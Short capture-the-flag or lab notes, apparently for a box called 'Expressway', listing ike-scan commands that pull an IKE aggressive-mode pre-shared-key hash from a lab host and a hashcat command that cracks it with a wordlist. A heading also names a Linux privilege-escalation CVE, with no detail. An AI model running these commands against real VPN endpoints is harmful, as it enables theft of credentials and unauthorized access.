# Expressway - IKE 500 / Linux PE CVE-2025-32463

### IKE - 500 port UDP

**Username & Hash extracts**

```bash
ike-scan -A --pskcrack 10.10.11.87
```

```bash
ike-scan -M -A 10.10.11.87
```

**Hashcat crack**

```bash
hashcat -m 5400 -a 0 hashfile /usr/share/wordlists/rockyou.txt
```

### CVE-2025-32463

Linux Privilege Escalation via CVE-2025-32463.
